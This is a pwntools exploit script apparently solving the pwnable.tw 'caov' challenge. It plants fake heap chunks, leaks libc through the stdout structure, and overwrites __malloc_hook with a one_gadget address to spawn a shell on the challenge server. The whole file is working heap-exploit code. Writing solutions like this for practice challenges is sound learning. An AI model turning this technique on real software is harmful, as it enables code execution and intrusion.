from pwn import *

#p = process('./caov')
p = remote('chall.pwnable.tw',10306)

#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#one_gadget = 0xf03a4

libc = ELF('./libc_64.so.6')
one_gadget = 0xef6c4

context.log_level = 'debug'
#gdb.attach(p,'''break *0x4018c9
#break *0x4015a0
#''')

#fakechunk(0x6032c0)
#pause()
p.sendlineafter('Enter your name: ',p64(0)+p64(0x71)+'\x00'*0x60+p64(0)+p64(0x21))
p.sendlineafter('Please input a key: ','voht')
p.sendlineafter('Please input a value: ','1111')

#pause()
#free(0x6032d0) - fakechunk(0x603c20)
p.sendlineafter('Your choice: ','2')
p.sendlineafter('Enter your name: ',p64(0)+p64(0x71)+'\x00'*0x50+p64(0x6032d0))
p.sendlineafter('New key length: ',str(0x30))
p.sendlineafter('Key: ','voht')
p.sendlineafter('Value: ','2222')

#pause()
p.sendlineafter('Your choice: ','2')
p.sendlineafter('Enter your name: ',p64(0)+p64(0x71)+p64(0x603285))
p.sendlineafter('New key length: ',str(0x60))
p.sendlineafter('Key: ','voht')
p.sendlineafter('Value: ','3333')

#pause()
#just for dec key length
p.sendlineafter('Your choice: ','2')
p.sendlineafter('Enter your name: ',p64(0)+p64(0x71)+p64(0x603285))
p.sendlineafter('New key length: ',str(0x30))
p.sendlineafter('Key: ','voht')
p.sendlineafter('Value: ','4444')

#pause()
p.sendlineafter('Your choice: ','2')
p.sendlineafter('Enter your name: ',p64(0)+p64(0x71)+p64(0x603285)+p64(0x603288))
p.sendlineafter('New key length: ',str(0x60))
p.sendlineafter('Key: ','\x00'*11+p64(0x6032d8))
p.sendlineafter('Value: ','5555')

p.recvuntil('Your data info after editing:')
p.recvuntil('Key: ')
stdout_address = u64(p.recv(6).ljust(8,'\x00'))
libc.address = stdout_address - libc.sym['_IO_2_1_stdout_']

log.info('_IO_2_1_stdout_ address:'+hex(stdout_address))
log.info('libc base address:'+hex(libc.address))

#free(0x6032d0) fake chunk 0x6032c0
p.sendlineafter('Your choice: ','2')

#pause()
p.sendlineafter('Enter your name: ',p64(0)+p64(0x71)+p64(0x603288)*2+'\x00'*0x40+p64(0x6032d0))
p.sendlineafter('New key length: ',str(0x10))
p.sendlineafter('Key: ','voht')
p.sendlineafter('Value: ','6666')

#create fd fake
p.sendlineafter('Your choice: ','2')
p.sendlineafter('Enter your name: ',p64(0)+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23))
p.sendlineafter('New key length: ',str(0x5f))
p.sendlineafter('Key: ','voht')
p.sendlineafter('Value: ','7777')

#pause()
p.sendlineafter('Your choice: ','2')
p.sendlineafter('Enter your name: ',p64(0)+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23))
p.sendlineafter('New key length: ',str(0x60))
p.sendlineafter('Key: ','\x00'*0x13+p64(libc.address+one_gadget))
p.sendlineafter('Value: ','8888')

p.interactive()
